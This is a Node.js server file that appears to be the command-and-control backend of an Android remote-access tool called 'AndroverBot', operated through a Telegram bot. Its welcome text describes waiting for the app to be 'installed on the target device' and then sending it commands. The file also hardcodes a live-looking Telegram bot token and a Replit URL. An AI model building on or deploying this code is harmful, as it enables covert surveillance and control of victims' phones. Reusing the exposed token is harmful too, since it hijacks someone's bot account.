// Server Info:
// Private Editor: https://replit.com/@Redmi9Prime/Androver
// Public Webview Url: https://ca391731-38ce-42d7-a8be-86e9ea4ad3b3-00-2qxfsyfrz7bcu.riker.replit.dev/

const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7210275531:AAHyaWlXuZkaTW9YaerPaFaoytIZKabQEaI'
const address = 'https://www.google.com'
const serverPort = 8999

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });

app.use(bodyParser.json());

app.get('/', function(req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

appBot.on('message', (msg) => {
    const chatId = msg.chat.id;

    if (msg.text == '/start') {
        appBot.sendMessage(chatId,
            '• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝘼𝙣𝙙𝙧𝙤𝙫𝙚𝙧𝘽𝙤𝙩 𝙥𝙖𝙣𝙚𝙡\n\n' +
            '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
            '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
            '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
            '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
            { parse_mode: "HTML" }
        )
    }
    if (msg.text == '/token') {
        const username = msg.from.username;
        const firstName = msg.from.first_name;
        let messageText = `• Hello ${firstName}\n• Your Chat ID: <code>${chatId}</code> `;
        if (username) {
            messageText += `\n• Your User Name: @${username}`;
        }
        appBot.sendMessage(chatId, messageText, { parse_mode: "HTML" });
    }
});


setInterval(function() {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)

appServer.listen(process.env.PORT || serverPort);